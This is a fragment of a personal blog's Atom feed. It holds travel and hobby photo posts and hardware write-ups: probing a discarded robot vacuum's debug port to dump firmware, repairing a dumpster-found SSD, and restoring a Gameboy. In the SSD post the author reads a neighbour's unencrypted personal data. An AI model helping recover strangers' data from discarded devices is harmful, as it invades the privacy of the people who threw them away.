        <updated>2023-12-31T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/coffee-art/" type="text/html"/>
        <id>https://johntuyen.com/gaze/coffee-art/</id>
        
        <content type="html">&lt;p&gt;Milk frothing from a Bellman is a challenge on it&#x27;s own. Many failed attempts but finally understood the quirks.&lt;&#x2F;p&gt;
&lt;img alt=&quot;Latte Art&quot; title=&quot;Latte Art&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;latte-art.9dfbfaf1b14e38c5.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;latte-art.f8b17e225cf9b082.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Oświęcim, Poland</title>
        <published>2023-10-15T00:00:00+00:00</published>
        <updated>2023-10-15T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/poland-oswiecim/" type="text/html"/>
        <id>https://johntuyen.com/gaze/poland-oswiecim/</id>
        
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;It happened, therefore it can happen again... it can happen anywhere. &lt;br &#x2F;&gt;&lt;br &#x2F;&gt; -Primo Levi&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I&#x27;ll never forget about this place 🙏&lt;&#x2F;p&gt;
&lt;img alt=&quot;Oświęcim, Poland&quot; title=&quot;Oświęcim, Poland&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;oswiecim.0d9e35c9c0ef9d07.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;oswiecim.7451a0982f2124ed.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Vienna, Austria</title>
        <published>2023-10-12T00:00:00+00:00</published>
        <updated>2023-10-12T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/austria-vienna/" type="text/html"/>
        <id>https://johntuyen.com/gaze/austria-vienna/</id>
        
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;&amp;quot;It&#x27;s like Berlin but smaller&amp;quot; &lt;br&gt;&lt;br&gt; - Local dweller&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Not just smaller but condensed with cool hidden gems to explore, rich in history&#x2F;art, and OG cafes to hang out.&lt;&#x2F;p&gt;
&lt;img alt=&quot;Vienna, Austria&quot; title=&quot;Vienna, Austria&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;vienna.0dd21e11f4e1f093.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;vienna.4f38280c342ac484.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Venice, Italy</title>
        <published>2023-10-01T00:00:00+00:00</published>
        <updated>2023-10-01T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/italy-venice/" type="text/html"/>
        <id>https://johntuyen.com/gaze/italy-venice/</id>
        
        <content type="html">&lt;p&gt;Where it all began 💑&lt;&#x2F;p&gt;
&lt;img alt=&quot;Venice Italy&quot; title=&quot;Venice Italy&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;venice.e35e226d9ee4e3e0.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;venice.776fd2ed6685e3f1.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Dog Watcher 👀</title>
        <published>2023-01-30T00:00:00+00:00</published>
        <updated>2023-01-30T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/doggos/" type="text/html"/>
        <id>https://johntuyen.com/gaze/doggos/</id>
        
        <content type="html">&lt;img alt=&quot;Doggo gang&quot; title=&quot;Doggo gang&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;doggos.1d96bde681b1da7a.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;doggos.4fbf2ad16206e0df.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>How hard is it?</title>
        <published>2023-01-30T00:00:00+00:00</published>
        <updated>2023-01-30T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/experiment-hardness/" type="text/html"/>
        <id>https://johntuyen.com/gaze/experiment-hardness/</id>
        
        <content type="html">&lt;img alt=&quot;Water hardness&quot; title=&quot;Water hardness&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;experiment-hardness.236af71af75b71b6.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;experiment-hardness.c5a5e507ecd11d0c.jpg 512w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Endurance</title>
        <published>2023-01-30T00:00:00+00:00</published>
        <updated>2023-01-30T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/gaze/running/" type="text/html"/>
        <id>https://johntuyen.com/gaze/running/</id>
        
        <content type="html">&lt;img alt=&quot;Marathon&quot; title=&quot;Marathon&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;running.97ef7c14641ffc0d.jpg&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;running.e231141a1ed9b4d8.jpg 512w, https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;running.97ef7c14641ffc0d.jpg 1024w&quot; class=&quot;&quot; &#x2F;&gt;

</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dumpster Diving: Robot Vacuum</title>
        <published>2022-12-26T00:00:00+00:00</published>
        <updated>2022-12-26T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/hardware-robotvacuum/" type="text/html"/>
        <id>https://johntuyen.com/posts/hardware-robotvacuum/</id>
        
        <content type="html">&lt;p&gt;Another day, another holiday season dumpster dive. My dear neighbours dumped a working Bobsweep robot vacuum cleaner made in 2016 and it didn&#x27;t look too shabby.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-1.jpeg&quot; alt=&quot;robotvacuum1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A quick test of the robot vacuum had a runtime of about 5 minutes hence why the owners most likely donated the device rather than dumping it. Rather than investing into a new battery and other replacing consumable parts, this would be a great IOT exercise of inspecting the internal components to see if it&#x27;s possible to dumping the flash memory of this device and extract the dumped firmware for potential endpoints and misconfiguration.&lt;&#x2F;p&gt;
&lt;p&gt;There are two methods to go about dumping the firmware from hardware devices. The first option is looking for a firmware on the internet would be the easiest route, but manufacture does not offer raw bin files. Second option would have been installing the mobile application and sync the robot vacuum with a device while intercepting the network traffic using man-in-the-middle attacks. However, the potential issue is the firmware update must be available for the robot vacuum and&#x2F;or finding an activity to trigger the action, these may or may not exist. I do have previous experience with those methods, so I wanted to try something new and learn more about: reading directly from on-chip flash using serial wire debugging port and fault injection to bypass read protection mechanism.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s break open the device and understand the lay of the land.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-2.jpeg&quot; alt=&quot;robotvacuum2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A breakout view of all the parts dismantled from the plastic housing. Many wires and separate modules that make up this robot vacuum: DC motors to operate the wheels and duster, dust bin sensors, speaker for alerts, infrared for wall and edge detection, and switches for bump detection.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-3.jpeg&quot; alt=&quot;robotvacuum3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A STM32F101VBT6 ARM microcontroller is used to control and operate this device. It is common these days to see ARM microcontrollers powering internet of things devices. My initial glance was looking for accessible test access ports or vias. I took note that on the upper right corner there is an open port that resembles a 10-pin JTAG connector to interface with the board.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-4.jpeg&quot; alt=&quot;robotvacuum4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The charging base is interesting. I took note of it using the same wireless module on the robot vacuum. The datasheet mentions an SPI interface which would need further technical investigation on what this would entail.&lt;&#x2F;p&gt;
&lt;p&gt;Now equipped with better clarity of the internal components and entry points, it&#x27;s time to test to see if the open port is a JTAG interface. By manually probing the traces of the microcontroller pinouts using the datasheet found online.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-5.jpeg&quot; alt=&quot;robotvacuum5&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The pinouts that are of interest is 21 (VREF), 72 (SWIO), 76 (SWCLK), and 53 (GND). These are the ports required for serial wire debugging access. As a frame of reference, the datasheet provides a reference table to determine which pinout belong to which main function.&lt;&#x2F;p&gt;
&lt;p&gt;After going through trial and error of determining if the mysterious open port is a JTAG, it&#x27;s worth experimenting a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;cyphunk&#x2F;JTAGenum&quot;&gt;DIY JTAG enumerator&lt;&#x2F;a&gt; using an Ardunio I have laying around. How it works is by assigning pins to the GPIO of the Arduino, it will enumerate the possible JTAG combinations to determine the correct pinouts to interface with the board.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-6.jpeg&quot; alt=&quot;robotvacuum6&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, this process can be fincky as crosstalk between unshielded wires is a possibility. There are built-in features to determine which pair of wires are causing crosstalk, but it was not necessary for this processs as it was eventually discovered that this port was not a JTAG port, shucks. Hope is not lost yet, back to tracing the pins on the board from the microcontroller datasheet. It&#x27;s hard to see where the traces lead between both sides of the board with a naked eye. The poor man&#x27;s way to identify traces on a board is a high-powered light shining behind the board, mark the vias, and touch points (labelled as TP). &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-7.jpeg&quot; alt=&quot;robotvacuum7&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-8.jpeg&quot; alt=&quot;robotvacuum8&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, the traces can now be traced to touch points for the pinouts of interest and solder pin headers for accessibility. The next part of the magic is using a hardware debugger tool called &lt;a href=&quot;https:&#x2F;&#x2F;black-magic.org&#x2F;&quot;&gt;Black Magic Debug&lt;&#x2F;a&gt;. What&#x27;s fancy about this debugger is it implements their own GDB server if you are familiar using GDB as your debugging tool. Not only that, GDB has scripting capabilities to automate your needs. The BMD kit provides an SWD breakout board of which you connect the identified touch point pinouts.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-9.jpeg&quot; alt=&quot;robotvacuum9&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;With all the connected cables to the BMD, interfacing with the board can now be achieved.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-10.png&quot; alt=&quot;robotvacuum10&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, when attempting to read the on-chip memory of the microcontroller, the read protection mechanism has been enabled by the manufacture. Shucks and kudos to the hardware development team following security best practices in their production units. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-robotvacuum&#x2F;hardware-robotvacuum-11.png&quot; alt=&quot;robotvacuum11&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;That&#x27;s it for now. This post will continue later when the second half of the story about trials and tribulation with fault injections is completed.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dumpster Diving: SSD</title>
        <published>2022-10-22T00:00:00+00:00</published>
        <updated>2022-10-22T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/hardware-ssdrepair/" type="text/html"/>
        <id>https://johntuyen.com/posts/hardware-ssdrepair/</id>
        
        <content type="html">&lt;p&gt;As we all know, we should be recycling more often than not and recycling electronics is not an exception. On my usual morning walks with my dog, someone dumped a full tower sized gaming PC with some hardware damaged with reckless intent. Nothing seemed salvagable and the parts were somewhat dated in the 2016 technology era of things. However, the SSD&#x2F;HDD were still up for grabs and it appears that the owner intentionally &amp;quot;keyed&amp;quot; the SATA ports in an attempt to destroy the data from being read. This unlucky soul did not realize that I live in the same building as them :D&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-1.jpeg&quot; alt=&quot;SSD1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;For the sake of curosity, I wanted to know if this drive has been encrypted or not, due to the fact that this person keyed the drive, they may not be savvy enough to understand encryption features.&lt;&#x2F;p&gt;
&lt;p&gt;Six dollars worth of spare parts were purchased from Aliexpress and made sure it had the right fitting as there are several different variations due to the PCB mounting holes. After waiting for a pain staking 4 weeks, the parts has arrived. On with the tutorial!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-7.jpeg&quot; alt=&quot;SSD2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To make life easier, using a pair of flush cutters to snip away the damaged SATA port module would allow removing the pins separately rather than a whole module. Keep in mind, this isn&#x27;t the way that most people would approach desoldering this component. Most experienced users would desolder the pins right away.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-2.jpeg&quot; alt=&quot;SSD3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Next, desoldering each of the pins using a clean soldering iron. This also includes the two grounding pads located on the left and right side of the SATA module.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-3.jpeg&quot; alt=&quot;SSD4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Each of the desoldered pin pads will need to be cleaned or else bad soldering joints may occur. Using a soldering braid wick will fix this up in a jiffy.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-4.jpeg&quot; alt=&quot;SSD5&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Time to slot in the new SATA module and solder the left and right grounding pads first for proper data pin alignment. Use plenty of flux on the data pins for the solder to flow and adhere to the PCB pads.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-5.jpeg&quot; alt=&quot;SSD6&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The final result of the soldering joints should be shiny and not dull. A dull look usually means a cold soldering joint which is bad. If all is well, put it back together and boot it up on a separate virtual machine or an isolated machine for testing purposes. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-ssdrepair&#x2F;hardware-ssdrepair-6.jpeg&quot; alt=&quot;SSD7&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As I&#x27;m not surprised, the drive is not encrypted. It can be mounted as NTFS and files are readable. The sensitive details that were found on this drive won&#x27;t be shared for obvious reasons. My curiosity has been satiated and reached to a conclusion. Don&#x27;t worry, I&#x27;ll follow best practices and ethics to ensure that data is wiped and destroyed.&lt;&#x2F;p&gt;
&lt;p&gt;This is a lesson for everyone: sanitize the data stored in electronics and physically destroy the electronics in an unrecoverable fashion. On a related note, those smart light bulbs that people throw out regularly can still store wifi passwords in plaintext and can be extracted using a logic analyzer. I&#x27;m waiting for one to show up in the recycling bin for demonstration purposes. That&#x27;s a sneak peak post to write about in the future!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Retro Classic: OG Gameboy</title>
        <published>2022-10-10T00:00:00+00:00</published>
        <updated>2022-10-10T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/hardware-gameboy/" type="text/html"/>
        <id>https://johntuyen.com/posts/hardware-gameboy/</id>
        
        <content type="html">&lt;p&gt;As I&#x27;m digging up my old boxes of things I need to dump out sooner or later, I found this classic gem. The original Nintendo Gameboy from 1991. At this point of time, this must have been sitting in a dark box for at least 20+ years. Thankfully, I have respected the sedimental value of the device by removing the batteries before long term storage to avoid battery corrosion. However, the glue that holds the display cover has dried and doesn&#x27;t hold the plastic bezel anymore. &lt;&#x2F;p&gt;
&lt;p&gt;As I&#x27;m popping in 4x AA batteries and feeling the weight of the device has made me wonder how did I held this monstrosity for such long hours as a kid. The Gameboy powers up without issues but the LCD display is showing missing lines of pixels, more than I can originally recall when I last used it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-1.jpeg&quot; alt=&quot;gameboy1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;No biggie. We didn&#x27;t have Google 30 years ago and now we do. A quick search shows that it&#x27;s a connection issue so if applying heat to the LCD ribbon cable and the LCD screen, it should resolve the missing pixels. Time to crack open the time capsule.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-2.jpeg&quot; alt=&quot;gameboy2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-3.jpeg&quot; alt=&quot;gameboy3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In comparison to modern day EE designs, this is visually minimal and pleasing to the eyes. The amount of dust inside is not bad at all considering the time of assembly until today. Hey look, a factory worker left a fingerprint on the copper shielding.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-4.jpeg&quot; alt=&quot;gameboy4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Time to strip the foam pad from the display that connects the ribbon cable and LCD screen and clean the residue.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-5.jpeg&quot; alt=&quot;gameboy5&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-6.jpeg&quot; alt=&quot;gameboy6&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If you take a look closely at the ribbon cable, you can see the vertical connections. These are the connections that will require reflow using low heat settings at around 280 celcius. Before I do that, here is a picture of what the display looks like without the reflow.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-7.jpeg&quot; alt=&quot;gameboy7&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Applying low heat is essential as anything higher than 300 celcius will burn the ribbon cable and will render the display useless. There are alternative solutions if this does happen which I will be showing later. For now, using my TS100 soldering iron, gently glide the hotend where the missing pixels are located. This will require patience as the heating and cooling process will take some time.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-8.jpeg&quot; alt=&quot;gameboy8&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After 10 minutes of gentle work, all the missing pixels are showing up again and the Gameboy is reassembled for old school nostalgia.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-9.jpeg&quot; alt=&quot;gameboy9&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-10.jpeg&quot; alt=&quot;gameboy10&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, this project isn&#x27;t completed. I still remember vividly as a kid that finding a good spot with lighting was essential for playing experience. As you can see, the LCD display is not backlit like how the later Gameboy Light models were. Knowing that I will most likely keep this device forever due to sentimental reasons, I&#x27;m going to give it a second life by modifying the screen using a modern IPS display.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-11.jpeg&quot; alt=&quot;gameboy11&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The IPS display kit includes the controller board, ribbon cable, glass bezel instead of the original plastic, and a plastic display jig. What I&#x27;ve added extra is replacing the old DC power regulator with an IPS supported version to support the extra milliamps required for the IPS display, and flash cart. More importantly, avoiding strain on the main components to keep this device alive in original condition as much as possible.&lt;&#x2F;p&gt;
&lt;p&gt;Before I start the modifications, I spent the extra time cleaning the shell, glue residue, and gunk build up over the past 30 years. Using a combination of isopropal alcohol 99%, dish liquid, wooden chopsticks, q-tips, tooth brush, elbow grease, and patience.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-12.jpeg&quot; alt=&quot;gameboy12&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-13.jpeg&quot; alt=&quot;gameboy13&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In case you were wondering, I did not proceed with the process called &amp;quot;Retro Brightening&amp;quot; as my Gameboy had been stored in a box. The shell has been protected against UV rays to prevent yellowing or discoloring of the shell. Retro Brightening is a chemical process to restore the original shell color and spray UV protection to slow down the process of discoloration. I may do this in the future if I ever decide on restoring my SNES just to experience the process.&lt;&#x2F;p&gt;
&lt;p&gt;Now that the case and parts are dry and clean, time to install the modifications. Here is a before and after modification of the DC regulator board. I love how the new board is much simplier than the 30 year old schematic.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-14.jpeg&quot; alt=&quot;gameboy14&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-15.jpeg&quot; alt=&quot;gameboy15&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-16.jpeg&quot; alt=&quot;gameboy16&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-17.jpeg&quot; alt=&quot;gameboy17&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Two screw posts snipped and cutting 1 mm of plastic around the display area as the IPS display has a larger screen real estate. Using a modeling knife and an object like a PCB board as a straight cutting guide to score the shell.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-18.jpeg&quot; alt=&quot;gameboy18&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Using a pair of flush cutters, snip the corners. Using a pair of flat pliers, bend back and forth the plastic that needs to be removed, it will become weak and cleanly snap off. Finally, use a filer to smooth the rough edges.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-19.jpeg&quot; alt=&quot;gameboy19&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Apply the double side sticky tape included in the kit and do not remove the padding adhesive facing the display. Install the IPS display and connect the ribbon cables.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-20.jpeg&quot; alt=&quot;gameboy20&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The hard part is completed. Desolder the speaker connected on the old board and solder to the new controller board.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-21.jpeg&quot; alt=&quot;gameboy21&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Place the buttons and membranes back into the front shell and install the controller board. Make sure not to over tighten the screws as the buttons won&#x27;t be responsive.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-22.jpeg&quot; alt=&quot;gameboy22&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Carefully connect the two halves of the shell back together while connecting the ribbon cable. Install the new glass bezel and voila! Enjoy the new bright and crispy IPS display and color changing features. My old man eyes are thanking me.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-23.jpeg&quot; alt=&quot;gameboy23&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;hardware-gameboy&#x2F;hardware-gameboy-24.jpeg&quot; alt=&quot;gameboy24&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Code Review Adventures</title>
        <published>2022-07-09T00:00:00+00:00</published>
        <updated>2022-07-09T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/pentesterslab/" type="text/html"/>
        <id>https://johntuyen.com/posts/pentesterslab/</id>
        
        <content type="html">&lt;h2 id=&quot;python-01&quot;&gt;Python 01&lt;&#x2F;h2&gt;
